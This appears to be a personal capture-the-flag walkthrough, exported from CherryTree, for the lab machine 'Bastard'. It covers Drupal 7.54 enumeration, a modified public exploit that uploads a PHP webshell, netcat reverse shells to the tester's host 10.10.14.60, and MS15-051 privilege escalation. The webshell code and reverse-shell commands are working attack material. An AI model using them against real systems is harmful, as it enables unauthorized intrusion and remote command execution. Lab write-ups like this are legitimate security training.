<!doctype html><html>
    <head>
      <meta http-equiv="content-type" content="text/html; charset=utf-8">
      <title>10.10.10.9 Bastard</title>
      <meta name="generator" content="CherryTree">
      <link rel="stylesheet" href="res/styles3.css" type="text/css" />
    </head>
    <body><div class='page'><h1 class='title'>10.10.10.9 Bastard</h1><br/>Nmap showed that only web and rpc was open.<br />dirsearch was running crazy slow, but did show me the directory /rest<br />when navigating to the website I saw that it was running drupal<br />drupwn enum showed me that it was running 7.54. We are in good shape!<br />drupwn exploit was able to upload a php webshell, but it was at a page I couldn&#39;t reach... back to the drawing board.<br />searchsploit showed me the exploit 41564.php<br />I added my own webshell so that I could upload and execute<br />###################################################################<br />$webshell = &lt;&lt;&lt;&#39;EOD&#39;<br />&lt;?php<br /> if (isset($_REQUEST[&#39;fupload&#39;])) {<br />  file_put_contents($_REQUEST[&#39;fupload&#39;], file_get_contents(&quot;http://10.10.14.60:8000/&quot; . $_REQUEST[&#39;fupload&#39;]));<br /> };<br /> if (isset($_REQUEST[&#39;fexec&#39;])) {<br />  $cmd = ($_REQUEST[&#39;fexec&#39;]);<br />  echo system($cmd);<br /> };<br />?&gt;<br />EOD;<br />##########################################################################<br />ran the exploit and it didn&#39;t work.<br />the endpoint_path was pointing to /rest_endpoint    which doesn&#39;t exist. change it to /rest (as found in dirsearch) and BOOM! upload complete!<br /><br />http://10.10.10.9/yee.php?fupload=nc.exe            uploads netcat<br /><a href="http://10.10.10.9/yee.php?fexec=nc.exe">http://10.10.10.9/yee.php?fexec=nc.exe</a>  10.10.14.60 3232 -e cmd.exe             gets reverse shell. User.txt!<br /><br />upload and run Sherlock.ps1 and see that the machine is vulnerable to MS15-051.<br />IMPORTANT<br />go to sec wiki and download the .zip version of the exploit. unzip, and upload ms15-051x64.exe<br /><br />ms15-051x64.exe whoami              system!<br />ms15-051x64.exe nc.exe 10.10.14.60 3233 -e cmd.exe<br />system shell!<br />root.txt<br /></div></body></html>